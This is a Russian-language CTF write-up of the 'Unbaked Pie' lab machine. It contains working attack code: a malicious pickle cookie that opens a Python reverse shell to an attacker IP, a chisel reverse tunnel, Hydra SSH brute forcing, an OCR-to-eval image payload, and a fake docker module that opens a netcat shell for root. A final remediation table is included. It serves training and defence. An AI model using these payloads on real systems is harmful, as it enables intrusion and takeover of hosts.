**Отчет о пентесте машины Unbaked Pie**


### Условие задачи

**Название:** Unbaked Pie

**Легенда:** Веб-приложение для обмена рецептами пирогов, построенное на Django. Задача — получить доступ к системе и повысить привилегии до root.

**Цель:** Получить пользовательский и корневой флаги.

**Доступ:** Веб-приложение на порту `5003`.


### 1. Разведка и обнаружение уязвимостей

**1.1. Сканирование сети**  
Первым этапом было выполнено сканирование портов с использованием Nmap. Обнаружен единственный открытый порт:

- **5003/tcp** — HTTP (WSGIServer 0.2, Python 3.8.6)

**1.2. Анализ веб-приложения**  
Приложение представляет собой блог с рецептами пирогов, построенный на Django 3.1.2 с использованием Bootstrap и jQuery.

**Ключевые находки:**
- **Режим отладки включен** (`DEBUG = True`). Это подтверждается сообщением на странице ошибки: *"You're seeing this error because you have DEBUG = True in your Django settings file"*.
- **Утечка информации через отладку**: при переходе на несуществующую страницу приложение раскрывает полный traceback, пути к файлам (`/home/site/homepage/views.py`), настройки Django и переменные окружения.

**1.3. Фаззинг директорий**  
В ходе фаззинга были обнаружены следующие эндпоинты:

| Путь | Статус | Назначение |
|------|--------|------------|
| `/about` | 200 | Страница информации |
| `/login` | 301 | Перенаправление на форму входа |
| `/logout` | 301 | Выход |
| `/signup` | 301 | Регистрация |
| `/share` | 200 | Форма загрузки рецептов |
| `/search` | 200 | Поиск по рецептам |

**1.4. Обнаружение `search_cookie`**  
В каждом запросе передавалась кука `search_cookie`, закодированная в Base64:

```
search_cookie="gASVBQAAAAAAAACMAXGULg=="
```

При декодировании Base64 было установлено, что это **pickle-сериализованный объект**. Это указывает на потенциальную уязвимость **Insecure Deserialization**.


### 2. Эксплуатация Insecure Deserialization (Pickle RCE)

**2.1. Анализ механизма формирования куки**  
При отправке поискового запроса `POST /search` с параметром `query` сервер формирует `search_cookie` путём сериализации введённой строки в pickle. Это было подтверждено экспериментально: при отправке `query=test` сервер возвращал `search_cookie="gASVCAAAAAAAAACMBHRlc3SULg=="`, что соответствует pickle от строки `"test"`.

**2.2. Создание malicious pickle**  
Был написан скрипт для генерации pickle-объекта, который при десериализации выполняет команду `os.system`:

```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        cmd = "export RHOST=\"192.168.135.182\";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'"
        return (os.system, (cmd,))

p = pickle.dumps(Exploit())
b64 = base64.b64encode(p)
print(b64.decode())
```

Полученный Base64 был внедрён в `search_cookie`. При следующем запросе сервер десериализовал pickle и выполнил команду, в результате чего был получен **reverse shell**.

**2.3. Получение доступа**  
После выполнения payload был получен shell с правами **root**:

```
id
uid=0(root) gid=0(root) groups=0(root)
```

**Важное примечание:** на данном этапе root был получен **внутри Docker-контейнера**, а не на хост-системе.


### 3. Обнаружение контейнера и попытки побега

**3.1. Признаки контейнера**  
- Наличие файла `/.dockerenv`.
- Отсутствие `docker.sock`.
- Невозможность добавить сетевой интерфейс (`ip link add dummy0 type dummy` → `Operation not permitted`).

**3.2. Анализ `.bash_history`**  
В истории команд root были обнаружены записи:

```
ssh ramsey@172.17.0.1
exit
ssh ramsey@172.17.0.1
```

Это указывало на то, что хост-система доступна по IP `172.17.0.1` (стандартный шлюз Docker), а пользователь `ramsey` существует на хосте.

**3.3. Проверка доступности хоста**  
```bash
nc -zv 172.17.0.1 22
```
Результат: `22 (ssh) open` — SSH-сервер на хосте доступен.


### 4. Извлечение хешей и брутфорс

**4.1. Скачивание `db.sqlite3`**  
Из контейнера был скачан файл `/home/site/db.sqlite3`, содержащий хеши пользователей.

**4.2. Анализ хешей**  
Запрос `SELECT * FROM auth_user;` выявил следующих пользователей:

| ID | Username | Password (hash) |
|----|----------|-----------------|
| 1 | aniqfakhrul | pbkdf2_sha256$216000$3fIfQIweKGJy$... |
| 11 | testing | pbkdf2_sha256$216000$0qA6zNH62sfo$... |
| 12 | ramsey | pbkdf2_sha256$216000$hyUSJhGMRWCz$... |
| 13 | oliver | pbkdf2_sha256$216000$Em73rE2NCRmU$... |
| 14 | wan | pbkdf2_sha256$216000$oFgeDrdOtvBf$... |

**4.3. Проброс порта через `chisel`**  
Поскольку SSH-клиент в контейнере отсутствовал, был использован `chisel` для проброса порта:

**На Kali (сервер):**
```bash
./chisel_1.9.1_linux_amd64 server -p 9001 --reverse
```

**В контейнере (клиент):**
```bash
./chisel_1.9.1_linux_amd64 client 192.168.135.182:9001 R:127.0.0.1:9002:172.17.0.1:22
```

**4.4. Брутфорс SSH**  
С помощью Hydra был подобран пароль для `ramsey`:

```bash
hydra -l ramsey -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1:9002
```

Результат: **`ramsey:12345678`**.

**4.5. Получение пользовательского доступа**  
```bash
ssh ramsey@127.0.0.1 -p 9002
```

Флаг пользователя был получен.


### 5. Эскалация привилегий до `oliver`

**5.1. Анализ `sudo -l` для `ramsey`**
```
User ramsey may run the following commands on unbaked:
    (oliver) /usr/bin/python /home/ramsey/vuln.py
```

Это означает, что `ramsey` может запустить `vuln.py` от имени `oliver`.

**5.2. Анализ `vuln.py`**  
В скрипте обнаружен вызов:

```python
LISTED = pytesseract.image_to_string(Image.open('payload.png'))
TOTAL = eval(LISTED)
```

**Механизм уязвимости:** скрипт распознаёт текст с картинки `payload.png` через OCR (Tesseract) и выполняет его через `eval()`. Поскольку `ramsey` имеет права на запись в `payload.png`, он может подменить картинку на содержащую произвольный Python-код.

**5.3. Создание malicious PNG**  
Была создана картинка с текстом `os.system("bash")`:

```python
from PIL import Image, ImageDraw, ImageFont

font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf", 60)
img = Image.new('RGB', (3000, 200), color='white')
d = ImageDraw.Draw(img)
d.text((50, 50), "os.system('bash')", fill='black', font=font)
img.save('payload.png')
```

**5.4. Запуск и получение `oliver`**  
```bash
sudo -u oliver /usr/bin/python /home/ramsey/vuln.py
```

В результате выполнения был получен shell от пользователя `oliver`:

```
uid=1002(oliver) gid=1002(oliver) groups=1002(oliver),1003(sysadmin)
```


### 6. Эскалация привилегий до root

**6.1. Анализ `sudo -l` для `oliver`**
```
(root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py
```

**Ключевой момент:** `SETENV` позволяет устанавливать переменные окружения при запуске команды через `sudo`.

**6.2. Анализ `dockerScript.py`**  
```python
import docker
client = docker.from_env()
client.containers.run("python-django:latest", "sleep infinity", detach=True)
```

Скрипт импортирует модуль `docker` и вызывает `docker.from_env()`. При этом **модуль `docker` не установлен** в системе (Python 3.5).

**6.3. Эксплуатация через подмену модуля**  
Был создан фейковый модуль `docker.py` в `/tmp/fake_docker/`:

```python
# /tmp/fake_docker/docker.py
import os

def from_env():
    os.system("busybox nc 192.168.135.182 5555 -e sh")
    return None
```

**6.4. Запуск с подменой `PYTHONPATH`**  
Благодаря `SETENV` удалось установить переменную окружения `PYTHONPATH`:

```bash
sudo PYTHONPATH=/tmp/fake_docker /usr/bin/python /opt/dockerScript.py
```

**Что произошло:**
1. Python ищет модуль `docker` в `PYTHONPATH` (`/tmp/fake_docker`) **раньше**, чем в стандартных путях.
2. Находит фейковый `docker.py`.
3. При вызове `docker.from_env()` выполняется `os.system("busybox nc ...")`.
4. Поскольку скрипт запущен через `sudo`, команда выполняется от **root**.

**6.5. Получение root**  
```bash
id
uid=0(root) gid=0(root) groups=0(root)
```

Корневой флаг был получен.


### 7. Итоговый вывод

В ходе пентеста машины Unbaked Pie были успешно реализованы следующие этапы:

1. **Разведка:** Обнаружение Django-приложения с включенным `DEBUG`, утечка информации, обнаружение `search_cookie` с pickle.
2. **Эксплуатация Pickle RCE:** Cоздание malicious pickle, получение reverse shell (root в контейнере).
3. **Container Escape:** Обнаружение хоста `172.17.0.1`, проброс SSH-порта через `chisel`.
4. **Брутфорс SSH:** Подбор пароля `ramsey:12345678` через Hydra.
5. **Эскалация до `oliver`:** Эксплуатация OCR + `eval()` через подмену `payload.png`.
6. **Эскалация до root:** Подмена модуля `docker` через `PYTHONPATH` и `SETENV`.

**Результат:** Полный контроль над системой. Получены пользовательский и корневой флаги.


### 8. Рекомендации по устранению

| Уязвимость | Рекомендация |
|------------|--------------|
| **Insecure Deserialization (Pickle)** | Не использовать `pickle` для пользовательских данных. Использовать JSON. |
| **DEBUG = True** | Отключить в production. |
| **Слабый пароль `ramsey`** | Использовать сложные пароли. |
| **OCR + `eval()`** | Не использовать `eval()` на пользовательских данных. |
| **Подмена модуля через `PYTHONPATH`** | Не использовать `SETENV` в `sudoers`. |
| **Отсутствие изоляции контейнера** | ограничить `PYTHONPATH`. |